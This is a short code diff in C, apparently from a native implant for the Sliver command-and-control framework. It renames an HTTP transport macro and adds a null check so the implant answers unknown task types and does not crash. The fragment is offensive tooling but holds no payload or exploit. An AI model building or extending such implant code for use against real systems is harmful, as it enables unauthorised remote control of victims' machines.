@@ -12,7 +12,7 @@ PSLIVER_SESSION_CLIENT SessionInit
 	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
 	pSessionClient->pGlobalConfig = pGlobalConfig;
 	pSessionClient->dwPollInterval = dwPollInterval;
-#ifdef __HTTP__
+#ifdef _HTTP
 	pSessionClient->Init = (CLIENT_INIT)HttpInit;
 	pSessionClient->Start = HttpStart;
 	pSessionClient->Send = HttpSend;
@@ -172,7 +172,14 @@ VOID SessionWork
 	pRecvEnvelope = pWrapper->pEnvelope;
 	HandlerList = GetSystemHandler();
 	SystemTaskHandler = HandlerList[pRecvEnvelope->uType];
-	pSendEnvelope = SystemTaskHandler(pRecvEnvelope);
+	if (SystemTaskHandler != NULL) {
+		pSendEnvelope = SystemTaskHandler(pRecvEnvelope);
+	}
+	else {
+		pSendEnvelope = ALLOC(sizeof(ENVELOPE));
+		pSendEnvelope->uID = pRecvEnvelope->uID;
+		pSendEnvelope->uUnknownMessageType = 1;
+	}
 
 	pSession = pWrapper->pSession;
 	if (!pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pSendEnvelope)) {
